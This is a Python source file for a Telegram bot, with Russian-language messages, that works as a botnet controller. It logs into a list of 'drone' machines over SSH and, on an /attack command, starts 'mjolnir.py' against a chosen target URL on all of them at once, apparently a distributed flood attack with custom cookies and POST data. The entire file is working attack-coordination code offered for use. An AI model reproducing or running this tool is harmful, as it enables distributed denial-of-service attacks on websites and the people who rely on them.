TOKEN = ''


class Drone:
    def __init__(self, host, port, usr, pwd):
        self.host = host
        self.port = port
        self.usr = usr
        self.pwd = pwd
        self.session = None

    def connect(self):
        if self.session is None:
            try:
                from pexpect import pxssh
                pxs = pxssh.pxssh()
                pxs.login(server=self.host,
                          username=self.usr,
                          password=self.pwd,
                          port=self.port)
                self.session = pxs
            except Exception as e:
                print(e)
        return self.session is not None

    def exec_cmd(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


class Hive:
    def __init__(self):
        self.hive = []

    def add_drn(self, host, port, usr, pwd):
        self.hive.append(Drone(host, port, usr, pwd))

    def brdcst(self, cmd):
        for drn in self.hive:
            if drn.connect():
                yield 'Drone:{} Out:{}'.format(drn.host, drn.exec_cmd(cmd))


class Bot:
    def __init__(self, token, params):
        from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
        self.updater = Updater(token=token, use_context=True)
        self.updater.dispatcher.add_handler(CommandHandler('start', self.start))
        self.updater.dispatcher.add_handler(CommandHandler('help', self.help))
        self.updater.dispatcher.add_handler(CommandHandler('attack', self.attack, pass_args=True))
        self.updater.dispatcher.add_handler(CommandHandler('target', self.target, pass_args=True))
        self.updater.dispatcher.add_handler(CommandHandler('cookie', self.cookie, pass_args=True))
        self.updater.dispatcher.add_handler(CommandHandler('data', self.data, pass_args=True))
        self.updater.dispatcher.add_handler(MessageHandler(Filters.command, self.unknown))
        self.updater.dispatcher.add_handler(MessageHandler(Filters.text, self.unknown))
        self.updater.start_polling()
        self.hive = Bot.get_hive(params)
        self.targets = []
        self.ck = None
        self.post_data = None

    @staticmethod
    def get_hive(params):
        hive = Hive()
        for drone in params['hive']:
            hive.add_drn(drone['host'], drone['port'], drone['user'], drone['passwd'])
        return hive

    @staticmethod
    def unknown(update, context):
        update.message.reply_text("Для помощи используйте /help")

    @staticmethod
    def start(update, context):
        update.message.reply_text('Робот Вертер приветствует {}!\nДля помощи используйте /help'
                                  .format(update.effective_user.username))

    def attack(self, update, context):
        import hashlib
        if len(context.args) > 0 and context.args[0].isnumeric():
            target_id = int(context.args[0])
            if 0 <= target_id < len(self.targets):
                target = self.targets[target_id]
                hash_str = hashlib.md5(target.encode('ascii')).digest()
                for msg in self.hive.brdcst('screen -dmS mjolnir-{} python3 mjolnir.py {}'.format(hash_str, target)):
                    update.message.reply_text(msg)
            else:
                update.message.reply_text("Не существует такой цели")
        else:
            update.message.reply_text("Неверный формат!\n/attack <target_id>")

    def data(self, update, context):
        def show_data(_):
            if self.post_data is not None:
                update.message.reply_text("Данные {}".format(self.post_data))
            else:
                update.message.reply_text("Данные не установлены")

        def set_data(cookie):
            if cookie is None:
                update.message.reply_text("Неверный формат!\n/data set <custom_data>")
            else:
                self.post_data = cookie
                update.message.reply_text("Данные установлены")

        def remove_data(_):
            self.post_data = None
            update.message.reply_text("Данные удалены")

        ACKs = {
            'show': show_data,
            'set': set_data,
            'remove': remove_data
        }

        try:
            ACKs[context.args[0]](context.args[1] if len(context.args) == 2 else None)
        except (IndexError, ValueError, KeyError):
            update.message.reply_text('Неверный формат!\n/data show/set/remove')

    def cookie(self, update, context):
        def show_cookie(_):
            if self.ck is not None:
                update.message.reply_text("Куки {}".format(self.ck))
            else:
                update.message.reply_text("Куки не установлены")

        def set_cookie(cookie):
            if cookie is None:
                update.message.reply_text("Неверный формат!\n/cookie set cookies")
            else:
                self.ck = cookie
                update.message.reply_text("Куки установлены")

        def remove_cookie(_):
            self.ck = None
            update.message.reply_text("Куки удалены")

        ACKs = {
            'show': show_cookie,
            'set': set_cookie,
            'remove': remove_cookie
        }

        try:
            ACKs[context.args[0]](context.args[1] if len(context.args) == 2 else None)
        except (IndexError, ValueError, KeyError):
            update.message.reply_text('Неверный формат!\n/cookie show/set/remove')

    def target(self, update, context):
        def lst_trgts(_):
            if len(self.targets) > 0:
                update.message.reply_text('\n'.join(['{}: {}'.format(id, trgt)
                                                     for id, trgt in zip(range(len(self.targets)), self.targets)]))
            else:
                update.message.reply_text('Не указано ни одной цели.')

        def add_trgt(trgt):
            from urllib.parse import urlparse
            if trgt is None:
                update.message.reply_text("Неверный формат!\n/target add <schema>://<ip>:<port>/<path>")
            else:
                url = urlparse(trgt)
                if url.scheme is not None and url.hostname is not None:
                    if trgt not in self.targets:
                        self.targets.append(trgt)
                        update.message.reply_text("Добавлена цель {}".format(trgt))
                    else:
                        update.message.reply_text("Цель {} уже существует".format(trgt))

        def remove_trgt(trgt):
            if trgt is None:
                update.message.reply_text("Неверный формат!\n/target remove <schema>://<ip>:<port>/<path>")
            else:
                if trgt in self.targets:
                    self.targets.remove(trgt)
                    update.message.reply_text("Удалена цель {}".format(trgt))
                else:
                    update.message.reply_text("Цель отсутствует в списке")

        ACKs = {
            'list': lst_trgts,
            'add': add_trgt,
            'remove': remove_trgt
        }

        try:
            ACKs[context.args[0]](context.args[1] if len(context.args) == 2 else None)
        except (IndexError, ValueError, KeyError):
            update.message.reply_text('Неверный формат!\n/target list/add/remove')

    @staticmethod
    def help(update, context):
        update.message.reply_text('\n'.join(['Для добавления целей используйте /target list/add/remove',
                                             'Для кастомизации данных POST запроса используйте /data show/set/remove',
                                             'Для кастомизации куки используйтк /cookie show/set/remove'
                                             'Для атаки используйте /attack <target_id>',
                                             'Для вызова этого сообщения используйте /help']))


if __name__ == '__main__':
    bot = Bot(TOKEN, {'hive': [{'host': 'localhost', 'port': 22, 'user': 'test', 'passwd': 'test'}]})
